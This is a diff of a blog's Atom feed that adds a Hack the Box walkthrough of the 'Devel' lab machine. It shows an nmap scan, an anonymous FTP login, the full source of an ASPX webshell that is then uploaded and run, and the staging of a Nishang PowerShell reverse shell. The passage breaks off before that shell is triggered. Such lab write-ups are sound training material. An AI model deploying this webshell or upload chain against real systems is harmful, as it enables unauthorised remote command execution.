@@ -1,5 +1,469 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat</title><link href="https://logistyxcat.github.io/" rel="alternate"></link><link href="https://logistyxcat.github.io%5Cfeeds/all.atom.xml" rel="self"></link><id>https://logistyxcat.github.io/</id><updated>2020-02-13T00:00:00-08:00</updated><entry><title>Lame - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-lame.html" rel="alternate"></link><published>2020-02-13T00:00:00-08:00</published><updated>2020-02-13T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-lame.html,2020-02-13:</id><summary type="html">&lt;p&gt;Guide to Lame on Hack the Box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>LogistyxCat</title><link href="https://logistyxcat.github.io/" rel="alternate"></link><link href="https://logistyxcat.github.io%5Cfeeds/all.atom.xml" rel="self"></link><id>https://logistyxcat.github.io/</id><updated>2020-02-20T00:00:00-08:00</updated><entry><title>Devel - Hack the Box</title><link href="https://logistyxcat.github.io%5Chtb-devel.html" rel="alternate"></link><published>2020-02-20T00:00:00-08:00</published><updated>2020-02-20T00:00:00-08:00</updated><author><name>Riley</name></author><id>tag:logistyxcat.github.io\htb-devel.html,2020-02-20:</id><summary type="html">&lt;p&gt;Guide to Devel on Hack the Box.&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Description&lt;/h2&gt;
+&lt;p&gt;Devel is a neat box that hosts a file server in the same directory that hosts a webserver, which allows anonymous uploads.  After uploading an aspx shell, the Windows 7 host is severely unpatched and likely has several kernel exploits available to use.&lt;/p&gt;
+&lt;p&gt;I also go over how to utilize Git to revert and explore old codebases, and compile the C# tool Watson.&lt;/p&gt;
+&lt;p&gt;Devel is assigned IP 10.10.10.5.&lt;/p&gt;
+&lt;h2&gt;Reconnaissance&lt;/h2&gt;
+&lt;p&gt;We begin by initiating an Nmap scan.&lt;/p&gt;
+&lt;h4&gt;Nmap&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# nmap -sC -sV -oA nmap/Devel 10.10.10.5&lt;/span&gt;
+Nmap scan report &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.10.10.5
+Host is up &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;.091s latency&lt;span class="o"&gt;)&lt;/span&gt;.
+Not shown: &lt;span class="m"&gt;998&lt;/span&gt; filtered ports
+PORT   STATE SERVICE VERSION
+&lt;span class="m"&gt;21&lt;/span&gt;/tcp open  ftp     Microsoft ftpd
+&lt;span class="p"&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class="o"&gt;(&lt;/span&gt;FTP code &lt;span class="m"&gt;230&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;03&lt;/span&gt;-18-17  &lt;span class="m"&gt;01&lt;/span&gt;:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
+&lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;03&lt;/span&gt;-17-17  &lt;span class="m"&gt;04&lt;/span&gt;:37PM                  &lt;span class="m"&gt;689&lt;/span&gt; iisstart.htm
+&lt;span class="p"&gt;|&lt;/span&gt;_03-17-17  &lt;span class="m"&gt;04&lt;/span&gt;:37PM               &lt;span class="m"&gt;184946&lt;/span&gt; welcome.png
+&lt;span class="p"&gt;|&lt;/span&gt; ftp-syst: 
+&lt;span class="p"&gt;|&lt;/span&gt;_  SYST: Windows_NT
+&lt;span class="m"&gt;80&lt;/span&gt;/tcp open  http    Microsoft IIS httpd &lt;span class="m"&gt;7&lt;/span&gt;.5
+&lt;span class="p"&gt;|&lt;/span&gt; http-methods: 
+&lt;span class="p"&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
+&lt;span class="p"&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/7.5
+&lt;span class="p"&gt;|&lt;/span&gt;_http-title: IIS7
+Service Info: OS: Windows&lt;span class="p"&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The only services that appear to be available are HTTP (80) and FTP (21), the latter having anonymous logins enabled.  The FTP server may be rooted to the same directory as the webserver; since we can log in anonymously, we should be able to download the files and verify this.&lt;/p&gt;
+&lt;h3&gt;Examining FTP access&lt;/h3&gt;
+&lt;p&gt;In order to log in to FTP, we need to use the username &lt;strong&gt;anonymous&lt;/strong&gt;, but the password can be anything -- even blank.&lt;/p&gt;
+&lt;h4&gt;Anonymous FTP login&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# ftp 10.10.10.5&lt;/span&gt;
+Connected to &lt;span class="m"&gt;10&lt;/span&gt;.10.10.5.
+&lt;span class="m"&gt;220&lt;/span&gt; Microsoft FTP Service
+Name &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.10.10.5:root&lt;span class="o"&gt;)&lt;/span&gt;: anonymous
+&lt;span class="m"&gt;331&lt;/span&gt; Anonymous access allowed, send identity &lt;span class="o"&gt;(&lt;/span&gt;e-mail name&lt;span class="o"&gt;)&lt;/span&gt; as password.
+Password: whateva
+&lt;span class="m"&gt;230&lt;/span&gt; User logged in.
+Remote system &lt;span class="nb"&gt;type&lt;/span&gt; is Windows_NT.
+ftp&amp;gt; dir
+&lt;span class="m"&gt;200&lt;/span&gt; PORT &lt;span class="nb"&gt;command&lt;/span&gt; successful.
+&lt;span class="m"&gt;125&lt;/span&gt; Data connection already open&lt;span class="p"&gt;;&lt;/span&gt; Transfer starting.
+&lt;span class="m"&gt;03&lt;/span&gt;-18-17  &lt;span class="m"&gt;01&lt;/span&gt;:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
+&lt;span class="m"&gt;03&lt;/span&gt;-17-17  &lt;span class="m"&gt;04&lt;/span&gt;:37PM                  &lt;span class="m"&gt;689&lt;/span&gt; iisstart.htm
+&lt;span class="m"&gt;03&lt;/span&gt;-17-17  &lt;span class="m"&gt;04&lt;/span&gt;:37PM               &lt;span class="m"&gt;184946&lt;/span&gt; welcome.png
+&lt;span class="m"&gt;226&lt;/span&gt; Transfer complete.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So we can access the FTP server content.  How about the website?&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Navigated to 10.10.10.5 in Firefox" src="images/ctf/htb/devel/http_80_web_root.png"&gt;&lt;/p&gt;
+&lt;p&gt;To verify this is the same directory as FTP, we can look at the &lt;code&gt;iisstart.htm&lt;/code&gt; from FTP and the website source in Firefox for a cross-comparison.&lt;/p&gt;
+&lt;h4&gt;Downloading iisstart.htm from FTP server&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ftp&amp;gt; get iisstart.htm
+local: iisstart.htm remote: iisstart.htm
+&lt;span class="m"&gt;200&lt;/span&gt; PORT &lt;span class="nb"&gt;command&lt;/span&gt; successful.
+&lt;span class="m"&gt;150&lt;/span&gt; Opening ASCII mode data connection.
+&lt;span class="m"&gt;226&lt;/span&gt; Transfer complete.
+&lt;span class="m"&gt;689&lt;/span&gt; bytes received in &lt;span class="m"&gt;0&lt;/span&gt;.09 secs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;.3856 kB/s&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The file will download to localhost at your &lt;code&gt;pwd&lt;/code&gt;.  Taking a look at the contents:&lt;/p&gt;
+&lt;h4&gt;cat iisstart.htm&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html PUBLIC &amp;quot;-//W3C//DTD XHTML 1.0 Strict//EN&amp;quot; &amp;quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&amp;quot;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt; &lt;span class="na"&gt;xmlns&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://www.w3.org/1999/xhtml&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Content-Type&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/html; charset=iso-8859-1&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;IIS7&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;lt;!&lt;/span&gt;&lt;span class="nt"&gt;--&lt;/span&gt;
+&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mh"&gt;#000000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mh"&gt;#B3B3B3&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;margin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;container&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;margin-left&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;auto&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;margin-right&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;auto&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="k"&gt;text-align&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;center&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="k"&gt;border&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="kc"&gt;none&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+
+&lt;span class="nt"&gt;--&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;style&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;container&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;amp;clcid=0x409&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;welcome.png&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;alt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;IIS7&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;width&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;571&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;height&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;411&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;a&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Back in Firefox, the source appears to be the same.
+&lt;img alt="Same HTML code" src="images/ctf/htb/devel/http_80_web_root_source.png"&gt;&lt;/p&gt;
+&lt;p&gt;So it's either the same directory or a source code repository; there isn't a good way to determine without some modifications to the content.  For this, we could try uploading our own files.&lt;/p&gt;
+&lt;p&gt;FTP provides functionality to both upload and download files.  We can locate a webshell and try uploading from there.&lt;/p&gt;
+&lt;p&gt;Kali Linux has basic webshells shipped by default in &lt;code&gt;/usr/share/webshells/&lt;/code&gt;; I don't know what software the server hosts at this time (ASP.NET, PHP, etc.), so it's possible that multiple shells will need to be tested.  We will try the &lt;code&gt;/usr/share/webshells/aspx/cmdasp.aspx&lt;/code&gt; shell to start.&lt;/p&gt;
+&lt;p&gt;This is the source code for the shell:&lt;/p&gt;
+&lt;h4&gt;cat /usr/share/webshells/aspx/cmdasp.aspx&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="no"&gt;Page&lt;/span&gt; &lt;span class="no"&gt;Language&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;C#&amp;quot;&lt;/span&gt; &lt;span class="no"&gt;Debug&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;true&amp;quot;&lt;/span&gt; &lt;span class="no"&gt;Trace&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;false&amp;quot;&lt;/span&gt; &lt;span class="cp"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="no"&gt;Import&lt;/span&gt; &lt;span class="no"&gt;Namespace&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;System.Diagnostics&amp;quot;&lt;/span&gt; &lt;span class="cp"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="cp"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt; &lt;span class="no"&gt;Import&lt;/span&gt; &lt;span class="no"&gt;Namespace&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;System.IO&amp;quot;&lt;/span&gt; &lt;span class="cp"&gt;%&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;script&lt;/span&gt; &lt;span class="na"&gt;Language=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;c#&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;runat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+void Page_Load(object sender, EventArgs e)
+{
+}
+string ExcuteCmd(string arg)
+{
+ProcessStartInfo psi = new ProcessStartInfo();
+psi.FileName = &amp;quot;cmd.exe&amp;quot;;
+psi.Arguments = &amp;quot;/c &amp;quot;+arg;
+psi.RedirectStandardOutput = true;
+psi.UseShellExecute = false;
+Process p = Process.Start(psi);
+StreamReader stmrdr = p.StandardOutput;
+string s = stmrdr.ReadToEnd();
+stmrdr.Close();
+return s;
+}
+void cmdExe_Click(object sender, System.EventArgs e)
+{
+Response.Write(&amp;quot;&lt;span class="nt"&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;&amp;quot;);
+Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+Response.Write(&amp;quot;&lt;span class="nt"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;&amp;quot;);
+}
+&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;HTML&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;HEAD&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;awen asp.net webshell&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/HEAD&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;body&lt;/span&gt; &lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;cmd&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;runat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;asp:TextBox&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;txtArg&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;runat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;server&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Width=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;250px&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/asp:TextBox&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;asp:Button&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;testing&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;runat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;server&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;Text=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;excute&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;OnClick=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;cmdExe_Click&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/asp:Button&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;asp:Label&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;lblText&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;style=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;runat=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;server&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Command:&lt;span class="nt"&gt;&amp;lt;/asp:Label&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/HTML&amp;gt;&lt;/span&gt;
+
+&lt;span class="c"&gt;&amp;lt;!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) --&amp;gt;&lt;/span&gt;
+&lt;span class="c"&gt;&amp;lt;!--    http://michaeldaw.org   04/2007    --&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The webshell will:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Take in input using a website form&lt;/li&gt;
+&lt;li&gt;Run the input through &lt;code&gt;cmd /c&lt;/code&gt; to execute on the server&lt;/li&gt;
+&lt;li&gt;Return the output of the command&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;This sort of shell would be a perfect test.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Note: A few quick edits can alter this to run PowerShell commands if that is preferable.  I've included instructions at the bottom of this guide.&lt;/em&gt;&lt;/p&gt;
+&lt;h2&gt;Nobody -&amp;gt; Web: Anonymous FTP upload to webshell execution&lt;/h2&gt;
+&lt;p&gt;To start, let's copy this into our current directory.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# cp /usr/share/webshells/aspx/cmdasp.aspx ./ttbcmd.aspx&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can use the FTP &lt;code&gt;put&lt;/code&gt; command to upload it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ftp&amp;gt; put ttbcmd.aspx
+local: ttbcmd.aspx remote: ttbcmd.aspx
+&lt;span class="m"&gt;200&lt;/span&gt; PORT &lt;span class="nb"&gt;command&lt;/span&gt; successful.
+&lt;span class="m"&gt;125&lt;/span&gt; Data connection already open&lt;span class="p"&gt;;&lt;/span&gt; Transfer starting.
+&lt;span class="m"&gt;226&lt;/span&gt; Transfer complete.
+&lt;span class="m"&gt;1442&lt;/span&gt; bytes sent in &lt;span class="m"&gt;0&lt;/span&gt;.00 secs &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;55&lt;/span&gt;.0079 MB/s&lt;span class="o"&gt;)&lt;/span&gt;
+ftp&amp;gt; dir
+&lt;span class="m"&gt;200&lt;/span&gt; PORT &lt;span class="nb"&gt;command&lt;/span&gt; successful.
+&lt;span class="m"&gt;125&lt;/span&gt; Data connection already open&lt;span class="p"&gt;;&lt;/span&gt; Transfer starting.
+&lt;span class="m"&gt;03&lt;/span&gt;-18-17  &lt;span class="m"&gt;01&lt;/span&gt;:06AM       &amp;lt;DIR&amp;gt;          aspnet_client
+&lt;span class="m"&gt;03&lt;/span&gt;-17-17  &lt;span class="m"&gt;04&lt;/span&gt;:37PM                  &lt;span class="m"&gt;689&lt;/span&gt; iisstart.htm
+&lt;span class="m"&gt;02&lt;/span&gt;-21-20  &lt;span class="m"&gt;07&lt;/span&gt;:05AM                 &lt;span class="m"&gt;1442&lt;/span&gt; ttbcmd.aspx
+&lt;span class="m"&gt;03&lt;/span&gt;-17-17  &lt;span class="m"&gt;04&lt;/span&gt;:37PM               &lt;span class="m"&gt;184946&lt;/span&gt; welcome.png
+&lt;span class="m"&gt;226&lt;/span&gt; Transfer complete.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That looks to have uploaded correctly.  We can try navigating to our webshell with curl or a browser to see if we can get remote execution.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Webshell access confirmed" src="images/ctf/htb/devel/http_80_webshell.png"&gt;&lt;/p&gt;
+&lt;p&gt;That the website rendered this new page is a good indicator that the server utilises ASP.NET content (and can thus execute C# code) and that the FTP server is set to the same directory as the IIS server.&lt;/p&gt;
+&lt;p&gt;Attempting to execute a command also provides good feedback.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Good news, everyone!" src="images/ctf/htb/devel/http_80_webshell_cmd-exec.png"&gt;&lt;/p&gt;
+&lt;h3&gt;Nishang Reverse TCP Shell&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://github.com/samratashok/nishang"&gt;Nishang&lt;/a&gt; provides several useful scripts and functions, including &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt;.  This script creates a reverse shell using a TCP stream. &lt;/p&gt;
+&lt;p&gt;Clone the Nishang Github repository and collect the desired shell script:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# git clone -C /opt https://github.com/samratashok/nishang&lt;/span&gt;
+Cloning into &lt;span class="s1"&gt;&amp;#39;nishang&amp;#39;&lt;/span&gt;...
+remote: Enumerating objects: &lt;span class="m"&gt;10&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+remote: Counting objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;/10&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+remote: Compressing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;/8&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+remote: Total &lt;span class="m"&gt;1686&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, pack-reused &lt;span class="m"&gt;1676&lt;/span&gt;
+Receiving objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1686&lt;/span&gt;/1686&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;8&lt;/span&gt;.88 MiB &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;.48 MiB/s, &lt;span class="k"&gt;done&lt;/span&gt;.
+Resolving deltas: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1053&lt;/span&gt;/1053&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
+&lt;span class="c1"&gt;# cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 ./&lt;/span&gt;
+&lt;span class="c1"&gt;# python3 -m http.server 80&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We will need to append a new line to the very bottom of the file to automatically execute the desired command:&lt;/p&gt;
